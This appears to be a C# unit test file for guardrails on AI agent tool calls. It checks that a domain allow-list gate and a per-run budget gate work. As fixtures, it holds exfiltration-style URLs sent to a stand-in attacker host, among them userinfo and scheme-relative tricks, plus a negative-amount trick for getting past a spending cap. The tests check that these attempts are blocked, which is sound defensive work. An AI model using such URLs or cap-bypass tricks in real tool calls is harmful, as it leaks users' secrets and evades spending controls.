// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors
// Licensed under the MIT License.

using System.Text.Json;
using AgentEval.MAF.Gatekeeper;
using AgentEval.Testing;
using Microsoft.Agents.AI;
using Microsoft.Extensions.AI;
using Xunit;

namespace AgentEval.Tests.MAF.Gatekeeper;

/// <summary>The deterministic beachhead: RunLedger + RunBudgetGate (denial-of-wallet) + DomainAllowListGate (exfil).</summary>
public class BeachheadGatesTests
{
    // ─────────────────────────── DomainAllowListGate (direct) ───────────────────────────

    private static GatedToolCall Call(string name, IReadOnlyDictionary<string, object?>? args)
        => new(name, args, AgentName: "A", Iteration: 0, FunctionCallIndex: 0, FunctionCount: 1, IsStreaming: false, Messages: null);

    [Fact]
    public async Task DomainAllowList_DisallowedDomain_Blocks()
    {
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "https://attacker.example/collect?d=secret" }));
        Assert.Equal(ToolGateAction.Block, v.Action);
    }

    [Fact]
    public async Task DomainAllowList_AllowedSubdomain_Allows()
    {
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "https://api.example.com/orders" }));
        Assert.Equal(ToolGateAction.Allow, v.Action);
    }

    [Fact]
    public async Task DomainAllowList_NoUrlInArgs_Allows()
    {
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("lookup_order", new Dictionary<string, object?> { ["orderId"] = "A-1001" }));
        Assert.Equal(ToolGateAction.Allow, v.Action);
    }

    [Fact]
    public async Task DomainAllowList_UserinfoTrick_ChecksRealHost_Blocks()
    {
        // https://example.com@attacker.example/ — the REAL host is attacker.example, not example.com.
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "https://example.com@attacker.example/x" }));
        Assert.Equal(ToolGateAction.Block, v.Action);
    }

    [Fact]
    public void DomainAllowList_EmptyList_Throws()
        => Assert.Throws<ArgumentException>(() => new DomainAllowListGate([]));

    // ─────────────────────────── RunBudgetGate (integration — needs the run scope) ───────────────────────────

    private static AIAgent BudgetAgent(RunBudgetGate gate, ScriptedChatClient model, AIFunction tool)
        => new ChatClientAgent(model, new ChatClientAgentOptions { Name = "A", ChatOptions = new ChatOptions { Tools = [tool] } })
            .AsBuilder()
            .UseAgentEvalGate()   // establishes the per-run RunLedger scope
            .UseAgentEvalToolGate([gate], ToolGatePolicy.Terminate)
            .Build();

    [Fact]
    public async Task RunBudget_MaxToolCalls_AdmitsN_BlocksBeyond()
    {
        var executed = 0;
        var tool = AIFunctionFactory.Create(() => { Interlocked.Increment(ref executed); return "ok"; }, "work");
        var model = new ScriptedChatClient()
            .AddToolCall("c1", "work", new Dictionary<string, object?>())
            .AddToolCall("c2", "work", new Dictionary<string, object?>())
            .AddToolCall("c3", "work", new Dictionary<string, object?>())
            .AddText("done");

        await BudgetAgent(new RunBudgetGate(maxToolCalls: 2), model, tool).RunAsync("go");

        Assert.Equal(2, executed);   // 2 admitted; the 3rd exceeds the budget → blocked + terminated
    }

    [Fact]
    public async Task RunBudget_PerTool_CapsTheSpecificTool()
    {
        var deletes = 0;
        var delete = AIFunctionFactory.Create(() => { Interlocked.Increment(ref deletes); return "ok"; }, "delete_account");
        var model = new ScriptedChatClient()
            .AddToolCall("c1", "delete_account", new Dictionary<string, object?>())
            .AddToolCall("c2", "delete_account", new Dictionary<string, object?>())
            .AddText("done");

        await BudgetAgent(
            new RunBudgetGate(maxCallsPerTool: new Dictionary<string, int> { ["delete_account"] = 1 }), model, delete)
            .RunAsync("go");

        Assert.Equal(1, deletes);   // one delete admitted; the second blocked
    }

    [Fact]
    public async Task RunBudget_Monetary_BlocksWhenRunningSumExceeds()
    {
        var executed = 0;
        var refund = AIFunctionFactory.Create((int amount) => { Interlocked.Increment(ref executed); return "ok"; }, "refund");
        var model = new ScriptedChatClient()
            .AddToolCall("c1", "refund", new Dictionary<string, object?> { ["amount"] = 60 })
            .AddToolCall("c2", "refund", new Dictionary<string, object?> { ["amount"] = 60 })
            .AddText("done");

        await BudgetAgent(new RunBudgetGate(maxMonetaryPerRun: ("amount", 100m)), model, refund).RunAsync("go");

        Assert.Equal(1, executed);   // first $60 admitted (sum 60); the second would make 120 > 100 → blocked
    }

    [Fact]
    public async Task RunBudget_IsSharedAcrossToolsButPerRun()
    {
        // The SAME gate instance across two separate runs: the ledger is keyed by the run scope, so each run
        // gets a fresh budget (this would fail if the ledger leaked across runs).
        var executed = 0;
        var gate = new RunBudgetGate(maxToolCalls: 1);
        AIFunction Tool() => AIFunctionFactory.Create(() => { Interlocked.Increment(ref executed); return "ok"; }, "work");
        ScriptedChatClient Script() => new ScriptedChatClient()
            .AddToolCall("c1", "work", new Dictionary<string, object?>())
            .AddToolCall("c2", "work", new Dictionary<string, object?>())
            .AddText("done");

        await BudgetAgent(gate, Script(), Tool()).RunAsync("run 1");
        await BudgetAgent(gate, Script(), Tool()).RunAsync("run 2");

        Assert.Equal(2, executed);   // 1 admitted per run (not 1 total) — per-run isolation
    }

    [Fact]
    public async Task RunBudget_NegativeAmount_CannotManufactureHeadroom()
    {
        // A negative "refund" must NOT reduce the running sum (or an attacker interleaves negatives to bypass the cap).
        var executed = 0;
        var pay = AIFunctionFactory.Create((int amount) => { Interlocked.Increment(ref executed); return "ok"; }, "pay");
        var model = new ScriptedChatClient()
            .AddToolCall("c1", "pay", new Dictionary<string, object?> { ["amount"] = 60 })
            .AddToolCall("c2", "pay", new Dictionary<string, object?> { ["amount"] = -1000 })   // would drive sum to -940 without the clamp
            .AddToolCall("c3", "pay", new Dictionary<string, object?> { ["amount"] = 60 })
            .AddText("done");

        await BudgetAgent(new RunBudgetGate(maxMonetaryPerRun: ("amount", 100m)), model, pay).RunAsync("go");

        // c1 (sum 60) + c2 (clamped to 0, sum stays 60) run; c3 would make 120 > 100 → blocked. Bypass closed.
        Assert.Equal(2, executed);
    }

    [Fact]
    public void RunBudget_NoBudget_Throws()
        => Assert.Throws<ArgumentException>(() => new RunBudgetGate());

    [Fact]
    public void RunBudget_ZeroMaxToolCalls_Throws()
        => Assert.Throws<ArgumentOutOfRangeException>(() => new RunBudgetGate(maxToolCalls: 0));

    // ─────────────────────────── RunLedger atomic admit ───────────────────────────

    [Fact]
    public void RunLedger_TryAdmit_ChecksAndRecordsAtomically()
    {
        var ledger = new RunLedger();
        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", maxTotal: 2, maxPerTool: null, monetaryArg: null, monetaryAmount: 0m, maxMonetary: 0m));
        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", maxTotal: 2, maxPerTool: null, monetaryArg: null, monetaryAmount: 0m, maxMonetary: 0m));
        Assert.Equal(RunBudgetDecision.TotalExceeded, ledger.TryAdmitToolCall("t", maxTotal: 2, maxPerTool: null, monetaryArg: null, monetaryAmount: 0m, maxMonetary: 0m));
        Assert.Equal(2, ledger.TotalToolCalls);   // the rejected call was not recorded
    }

    [Fact]
    public void RunLedger_TryAdmit_NegativeAmount_DoesNotReduceSum()
    {
        var ledger = new RunLedger();
        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", null, null, "amount", 100m, 100m));
        // A negative amount is clamped to 0 inside the ledger — the sum stays at 100, not 100 + (-100).
        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", null, null, "amount", -100m, 100m));
        Assert.Equal(100m, ledger.MonetarySum("amount"));
    }

    // ─────────────────────────── DomainAllowListGate — extra egress forms ───────────────────────────

    [Fact]
    public async Task DomainAllowList_SchemeRelativeUrl_Blocks()
    {
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "//attacker.example/collect?d=secret" }));
        Assert.Equal(ToolGateAction.Block, v.Action);
    }

    [Fact]
    public async Task DomainAllowList_NonHttpScheme_OffListHost_Blocks()
    {
        // Blocks because the HOST (attacker.example) is off-list — the gate scans non-http schemes too, but it
        // gates by host, not by scheme.
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("fetch", new Dictionary<string, object?> { ["url"] = "ftp://attacker.example/x" }));
        Assert.Equal(ToolGateAction.Block, v.Action);
    }

    [Fact]
    public async Task DomainAllowList_IPv6Literal_MatchesHostInsideBrackets()
    {
        var gate = new DomainAllowListGate(["[::1]"]);
        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "https://[::1]:8080/x" }))).Action);
        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "https://[fe80::2]/x" }))).Action);
    }

    [Fact]
    public async Task RunBudget_Monetary_HandlesJsonElementArgs()
    {
        // Tool-call arguments often arrive as JsonElement — the monetary budget must parse them, not ignore them.
        var gate = new RunBudgetGate(maxMonetaryPerRun: ("amount", 100m));
        using var doc = JsonDocument.Parse("150");   // a JsonElement over the $100 cap
        var v = await gate.InspectAsync(Call("pay", new Dictionary<string, object?> { ["amount"] = doc.RootElement.Clone() }));
        Assert.Equal(ToolGateAction.Block, v.Action);   // 150 > 100 — would be Allow if JsonElement were treated as "no amount"
    }

    [Fact]
    public async Task DomainAllowList_QueryString_DoesNotFoldIntoHost_Allows()
    {
        var gate = new DomainAllowListGate(["example.com"]);
        var v = await gate.InspectAsync(Call("fetch", new Dictionary<string, object?> { ["url"] = "https://api.example.com?token=abc" }));
        Assert.Equal(ToolGateAction.Allow, v.Action);
    }
}
